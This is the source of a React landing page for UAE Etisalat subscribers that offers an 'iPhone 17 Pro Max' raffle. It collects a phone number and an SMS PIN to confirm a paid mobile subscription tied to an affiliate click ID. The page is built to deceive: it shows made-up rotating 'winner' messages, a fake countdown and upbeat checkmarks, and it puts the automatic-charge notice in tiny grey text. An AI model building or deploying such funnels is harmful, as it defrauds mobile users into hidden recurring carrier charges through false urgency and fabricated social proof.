import { useState, useEffect } from "react";

export default function Home() {
  const [msisdn, setMsisdn] = useState("");
  const [pin, setPin] = useState(""); 
  const [clickId, setClickId] = useState("");
  const [txid, setTxid] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(1);
  const [errorMsg, setErrorMsg] = useState(""); 
  const [liveWinner, setLiveWinner] = useState("Ahmed from Dubai just won a chance to win in a raffle 🎁");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("cid")) {
      setClickId(params.get("cid"));
    }

    const winners = [
      "Ahmed from Dubai just won a chance to win in a raffle 🎁",
      "Ali from Ajman confirmed his participation 🔥",
      "Fatima from Abu Dhabi just received her draw code ✅",
      "Sultan from Sharjah entered the grand draw ⚡"
    ];
    const interval = setInterval(() => {
      setLiveWinner(winners[Math.floor(Math.random() * winners.length)]);
    }, 4000);

    return () => clearInterval(interval);
  }, []);

  async function submitNumber() {
    if (!msisdn) {
      setErrorMsg("Please enter your mobile number.");
      return;
    }
    setLoading(true);
    setErrorMsg("");

    // 🛡️ 核心终极防御清洗逻辑：彻底干掉用户重复输入的各种区号
    let cleanMsisdn = msisdn.trim();
    
    // 1. 去掉前面的 00
    if (cleanMsisdn.startsWith("00")) {
      cleanMsisdn = cleanMsisdn.substring(2);
    }
    // 2. 去掉开头的单个 0
    if (cleanMsisdn.startsWith("0")) {
      cleanMsisdn = cleanMsisdn.substring(1);
    }
    // 3. 极其重要：如果用户在输入框里又手抖打了 97156... 帮他把开头的 971 抠掉！
    if (cleanMsisdn.startsWith("971")) {
      cleanMsisdn = cleanMsisdn.substring(3);
    }

    // 4. 重新格式化为广告主 CP 100% 接受的标准 9715xxxxxxxx 格式
    const finalMsisdn = "971" + cleanMsisdn;

    try {
      const response = await fetch(`/api/request?msisdn=${finalMsisdn}&click_id=${clickId}`);
      const data = await response.json();
      if (data.success) {
        setTxid(data.txid);
        setStep(2);
      } else {
        setErrorMsg("❌ Sorry, this number is not eligible.");
      }
    } catch (err) {
      setErrorMsg("❌ Connection error, please try again.");
    }
    setLoading(false);
  }

  async function submitPin() {
    if (!pin || pin.length < 4) {
      setErrorMsg("Please enter the 4-digit PIN code.");
      return;
    }
    setLoading(true);
    setErrorMsg("");

    try {
      const response = await fetch(`/api/verify?txid=${txid}&pin=${pin}&click_id=${clickId}`);
      const data = await response.json();
      if (data.stateCode === 0 || data.stateCode === 2) {
        setStep(3);
      } else {
        setErrorMsg("❌ Incorrect PIN code. Please try again.");
      }
    } catch (err) {
      setErrorMsg("❌ Verification failed, please try again.");
    }
    setLoading(false);
  }

  return (
    <div style={styles.page}>
      <div style={styles.liveBanner}>
        <span style={styles.pulseDot}></span> {liveWinner}
      </div>

      <div style={styles.card}>
        <div style={styles.topBadge}>Exclusive offer for Etisalat subscribers</div>

        <div style={styles.imageContainer}>
          <img
            src="https://i.ibb.co/B5tGx9x2/iphone-16.png"
            style={styles.phone}
            alt="iPhone 17 Pro"
          />
        </div>

        <h1 style={styles.title}>iPhone 17 Pro Max</h1>
        <p style={styles.subtitle}>🎁 The biggest annual draw in the UAE</p>

        <div style={styles.countdownBox}>
          ⏰ Offer ends during
          <div style={styles.countdownTimer}>2:46</div>
        </div>

        <div style={styles.trustList}>
          <div style={styles.trustItem}>Enter your phone number <span style={styles.checkmark}>✓</span></div>
          <div style={styles.trustItem}>Confirm subscription <span style={styles.checkmark}>✓</span></div>
          <div style={styles.trustItem}>Enter the draw immediately <span style={styles.checkmark}>✓</span></div>
        </div>

        {errorMsg && <div style={styles.errorBubble}>{errorMsg}</div>}

        {/* 步骤 1：输入手机号 */}
        {step === 1 && (
          <div style={styles.formSection}>
            <div style={styles.phoneInputContainer}>
              <div style={styles.countryCodeBox}>+971</div>
              <input
                type="tel"
                placeholder="5xxxxxxxx"
                value={msisdn}
                onChange={(e) => setMsisdn(e.target.value.replace(/\D/g, ""))}
                style={styles.inputField}
              />
            </div>

            <button style={styles.button} onClick={submitNumber} disabled={loading}>
              {loading ? "Processing..." : "Participate now 🎁"}
            </button>

            <div style={styles.bottomText}>
              By clicking the button, you agree to the terms and conditions. The fee will be charged automatically.
            </div>
          </div>
        )}

        {/* 步骤 2：输入 PIN 验证码 */}
        {step === 2 && (
          <div style={styles.formSection}>
            <div style={styles.successAlert}>
              ✅ Verification code has been sent via SMS!
            </div>

            <input
              type="tel"
              placeholder="••••"
              maxLength={4}
              value={pin}
              onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
              style={styles.pinInput}
            />

            <button style={styles.buttonVerify} onClick={submitPin} disabled={loading}>
              {loading ? "Confirming..." : "Confirm Code ⚡"}
            </button>
          </div>
        )}

        {/* 步骤 3：成功 */}
        {step === 3 && (
          <div style={styles.successBox}>
            <div style={styles.successIcon}>✓</div>
            <div style={styles.successTitle}>Confirmed!</div>
            <p style={styles.successText}>You have successfully entered the official raffle.</p>
          </div>
        )}
      </div>
    </div>
  );
}

const styles = {
  page: {
    minHeight: "100vh",
    background: "#0a0a0a",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    padding: "60px 15px 40px 15px",
    boxSizing: "border-box",
    position: "relative"
  },
  liveBanner: {
    position: "fixed",
    top: 0,
    left: 0,
    right: 0,
    height: "44px",
    background: "#22c55e",
    color: "#fff",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    fontSize: "14px",
    fontWeight: "bold",
    zIndex: 100,
    boxShadow: "0 2px 10px rgba(0,0,0,0.3)"
  },
  pulseDot: {
    width: "6px",
    height: "6px",
    background: "#fff",
    borderRadius: "999px",
    marginRight: "8px",
    display: "inline-block"
  },
  card: {
    width: "100%",
    maxWidth: "400px",
    background: "#121212",
    borderRadius: "24px",
    padding: "24px 20px",
    textAlign: "center",
    border: "1px solid #1a1a1a",
    boxShadow: "0 20px 50px rgba(0,0,0,0.8)",
    boxSizing: "border-box"
  },
  topBadge: {
    display: "inline-block",
    background: "#eab308",
    color: "#000",
    padding: "6px 16px",
    borderRadius: "999px",
    fontSize: "13px",
    fontWeight: "bold",
    marginBottom: "16px"
  },
  imageContainer: {
    margin: "0 auto 12px auto"
  },
  phone: {
    width: "130px",
    height: "auto",
    display: "block",
    margin: "0 auto"
  },
  title: {
    color: "#fff",
    fontSize: "28px",
    fontWeight: "bold",
    margin: "0 0 4px 0"
  },
  subtitle: {
    color: "#a3a3a3",
    fontSize: "14px",
    margin: "0 0 16px 0"
  },
  countdownBox: {
    background: "#7f1d1d",
    color: "#fff",
    padding: "10px",
    borderRadius: "14px",
    fontSize: "14px",
    fontWeight: "bold",
    marginBottom: "16px"
  },
  countdownTimer: {
    fontSize: "24px",
    fontWeight: "900",
    color: "#eab308",
    marginTop: "2px"
  },
  trustList: {
    background: "#1e293b",
    borderRadius: "14px",
    padding: "10px 14px",
    marginBottom: "20px",
    display: "flex",
    flexDirection: "column",
    gap: "8px"
  },
  trustItem: {
    color: "#fff",
    fontSize: "13px",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    gap: "6px"
  },
  checkmark: {
    color: "#22c55e",
    fontWeight: "bold"
  },
  formSection: {
    width: "100%",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    boxSizing: "border-box"
  },
  
  /* 恢复标准英文从左到右排版，确保完美对齐 */
  phoneInputContainer: {
    display: "flex",
    width: "100%",
    height: "54px",
    borderRadius: "14px",
    border: "2px solid #334155",
    background: "#0f172a",
    overflow: "hidden",
    marginBottom: "14px",
    boxSizing: "border-box"
  },
  countryCodeBox: {
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    background: "#1e293b", 
    color: "#fff",
    fontSize: "16px",
    fontWeight: "bold",
    padding: "0 16px",
    borderRight: "1px solid #334155",
    userSelect: "none"
  },
  inputField: {
    flex: 1,
    background: "transparent",
    border: "none",
    color: "white",
    padding: "0 16px",
    fontSize: "18px",
    outline: "none",
    fontWeight: "bold",
    letterSpacing: "1px",
    textAlign: "left"
  },

  pinInput: {
    width: "100%",
    height: "54px",
    borderRadius: "14px",
    border: "2px solid #eab308",
    background: "#0f172a",
    color: "#eab308",
    padding: "0 16px",
    fontSize: "24px",
    textAlign: "center",
    letterSpacing: "12px",
    marginBottom: "14px",
    outline: "none",
    fontWeight: "bold",
    boxSizing: "border-box"
  },
  button: {
    width: "100%",
    height: "54px",
    borderRadius: "14px",
    border: "none",
    background: "#eab308",
    color: "#000",
    fontSize: "18px",
    fontWeight: "bold",
    cursor: "pointer",
    marginBottom: "12px",
    boxSizing: "border-box",
    boxShadow: "0 4px 15px rgba(234,179,8,0.2)"
  },
  buttonVerify: {
    width: "100%",
    height: "54px",
    borderRadius: "14px",
    border: "none",
    background: "#22c55e",
    color: "#fff",
    fontSize: "18px",
    fontWeight: "bold",
    cursor: "pointer",
    marginBottom: "12px",
    boxSizing: "border-box"
  },
  errorBubble: {
    background: "rgba(239,68,68,0.2)",
    border: "1px solid #ef4444",
    color: "#ef4444",
    padding: "10px",
    borderRadius: "10px",
    fontSize: "13px",
    marginBottom: "14px",
    width: "100%",
    boxSizing: "border-box"
  },
  bottomText: {
    color: "#4b5563",
    fontSize: "10px",
    lineHeight: "1.4",
    marginTop: "4px"
  },
  successAlert: {
    background: "rgba(34,197,94,0.1)",
    border: "1px solid #22c55e",
    color: "#22c55e",
    padding: "10px",
    borderRadius: "10px",
    fontSize: "12px",
    marginBottom: "14px",
    width: "100%",
    boxSizing: "border-box"
  },
  successBox: {
    padding: "20px 0"
  },
  successIcon: {
    width: "60px",
    height: "60px",
    borderRadius: "999px",
    background: "#22c55e",
    color: "white",
    fontSize: "32px",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    margin: "0 auto 12px auto"
  },
  successTitle: {
    color: "#fff",
    fontSize: "24px",
    fontWeight: "bold"
  },
  successText: {
    color: "#a3a3a3",
    fontSize: "14px"
  }
};